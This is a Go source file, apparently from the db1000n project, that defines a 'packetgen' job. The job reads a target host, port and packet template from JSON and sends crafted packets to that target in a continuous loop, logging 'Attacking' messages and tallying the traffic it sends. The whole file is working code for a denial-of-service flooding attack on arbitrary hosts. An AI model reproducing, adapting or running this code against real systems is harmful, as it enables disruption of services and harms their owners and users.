package job

import (
	"context"
	"encoding/json"
	"strconv"
	"time"

	"github.com/Arriven/db1000n/logs"
	"github.com/Arriven/db1000n/metrics"
	"github.com/Arriven/db1000n/packetgen"
	"github.com/Arriven/db1000n/template"
	"github.com/google/uuid"
)

func packetgenJob(ctx context.Context, l *logs.Logger, args Args) error {
	defer panicHandler()
	type packetgenJobConfig struct {
		BasicJobConfig
		Packet json.RawMessage
		Host   string
		Port   string
	}
	var jobConfig packetgenJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		l.Error("error parsing json: %v", err)
		return err
	}

	host := template.Execute(jobConfig.Host)
	port, err := strconv.Atoi(template.Execute(jobConfig.Port))
	if err != nil {
		l.Error("error parsing port: %v", err)
		return err
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())

	for jobConfig.Next(ctx) {
		select {
		case <-ticker.C:
			l.Info("Attacking %v:%v", jobConfig.Host, jobConfig.Port)
		default:
		}

		packetConfigBytes := []byte(template.Execute(string(jobConfig.Packet)))
		l.Debug("[packetgen] parsed packet config template:\n%s", string(packetConfigBytes))
		var packetConfig packetgen.PacketConfig
		err := json.Unmarshal(packetConfigBytes, &packetConfig)
		if err != nil {
			l.Error("error parsing json: %v", err)
			return err
		}
		packetConfigBytes, err = json.Marshal(packetConfig)
		if err != nil {
			l.Error("error marshaling back to json: %v", err)
			return err
		}
		l.Debug("[packetgen] parsed packet config:\n%v", string(packetConfigBytes))
		len, err := packetgen.SendPacket(packetConfig, host, port)
		if err != nil {
			l.Error("error sending packet: %v", err)
			return err
		}
		trafficMonitor.Add(len)
	}
	return nil
}
